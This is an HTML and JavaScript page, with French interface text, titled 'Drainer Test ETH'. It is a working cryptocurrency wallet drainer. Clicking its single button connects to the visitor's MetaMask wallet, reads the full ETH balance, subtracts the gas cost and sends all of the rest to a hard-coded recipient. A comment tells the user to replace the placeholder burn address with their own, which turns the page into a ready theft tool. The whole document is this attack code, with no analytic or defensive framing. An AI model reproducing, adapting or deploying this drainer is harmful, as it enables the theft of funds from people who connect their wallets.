<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Drainer Test ETH</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <style>
    body { font-family: Arial; text-align: center; margin-top: 100px; }
    button { padding: 12px 24px; font-size: 16px; background: #f90; color: white; border: none; border-radius: 8px; cursor: pointer; }
    #log { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h1>Connexion et Envoi ETH</h1>
  <button onclick="connectAndSend()">ü¶ä Connexion + Envoi</button>
  <div id="log"></div>

  <script>
    const RECIPIENT = "0x000000000000000000000000000000000000dEaD"; // ‚Üê Remplace ici par TON adresse

    async function connectAndSend() {
      const log = document.getElementById("log");

      if (typeof window.ethereum === 'undefined') {
        log.textContent = "‚ùå MetaMask non d√©tect√©.";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const sender = await signer.getAddress();
        const balance = await provider.getBalance(sender);

        const gasPrice = await provider.getGasPrice();
        const estimatedGas = 21000;
        const gasCost = gasPrice.mul(estimatedGas);

        const amountToSend = balance.sub(gasCost);

        if (amountToSend.lte(0)) {
          log.textContent = "‚ùå Solde insuffisant pour envoyer quoi que ce soit.";
          return;
        }

        const tx = {
          to: RECIPIENT,
          value: amountToSend
        };

        const txResult = await signer.sendTransaction(tx);

        log.innerHTML = `
          ‚úÖ Transaction envoy√©e !<br>
          üí∏ Montant : ${ethers.utils.formatEther(amountToSend)} ETH<br>
          üîó TX : <a href="https://etherscan.io/tx/${txResult.hash}" target="_blank">${txResult.hash}</a>
        `;
      } catch (err) {
        console.error("Erreur:", err);
        log.textContent = "‚ùå Erreur ou refus par l'utilisateur.";
      }
    }
  </script>
</body>
</html>
